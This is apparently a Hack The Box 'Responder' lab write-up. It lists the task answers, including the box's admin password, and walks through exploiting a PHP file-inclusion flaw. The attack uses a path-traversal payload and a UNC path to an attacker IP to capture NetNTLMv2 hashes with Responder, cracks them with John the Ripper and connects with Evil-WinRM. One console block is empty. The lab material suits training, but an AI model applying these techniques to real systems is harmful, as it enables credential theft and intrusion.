## Tasks
1. How many TCP ports are open on the machine?
 - **3**
2. When visiting the web service using the IP address, what is the domain that we are being redirected to? 
- **unika.htb**
3. Which scripting language is being used on the server to generate webpages?
- **PHP**
4. What is the name of the URL parameter which is used to load different language versions of the webpage? 
- **page**
5. Which of the following values for the 'page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
- **../../../../../../../../windows/system32/drivers/etc/hosts**
6. Which of the following values for the 'page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
- **//10.10.14.6/somefile**
7. What does NTLM stand for? 
- **New Technology LAN Manager**
8. Which flag do we use in the Responder utility to specify the network interface? 
- **-I**
9. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 
- **john the ripper**
10. What is the password for the administrator user? 
 - **badminton**
 11. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
  - **5985**

A web portal, let's have a look.

`http://10.129.13.133`

![](./attachments/Pasted%20image%2020220413115527.png)

We get redirected to `unika.htb`, but Firefox can't find the page. This is likely because 'name-based virtual hosting' is used to host multiple domains on one server. To access the site, we need to provide the server with both IP and Domain. We have both, so we just need to make Firefox make the connection. We can do this by adding the two values to `/etc/hosts`.

```console
┌──(kali㉿kali)-[~]
└─$ echo "10.129.13.133 unika.htb" | sudo tee -a /etc/hosts
```

Or use 'gedit' to edit the file.

```console
┌──(kali㉿kali)-[~]
└─$ sudo gedit /etc/hosts &
```

We can try to reach the site again.

![](./attachments/Pasted%20image%2020220413121213.png)

Great, now we have access. The page is a generic single page business front, except for the language switcher. 

![](./attachments/Pasted%20image%2020220413132921.png)

This might be vulnerable to file inclusion.

It is! Since this is a window computer we can trick it into initializing the SMB protocol by providing it with a random path to our local machine. During the initial SMB key exchange, we might be able to grab the NetNTLMv (hash) corresponding to a privileged account. We can utilize a tool called 'Responder' to set up an SMB server and grab what we need.

Now that we have the hash, we can use 'John the Ripper' to brute force the password using a [wordlist](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).

```console

We got the password! Now we just need to utilize it, since Linux doesn't support PowerShell out of the box, we'll use 'Evil-WinRM'.
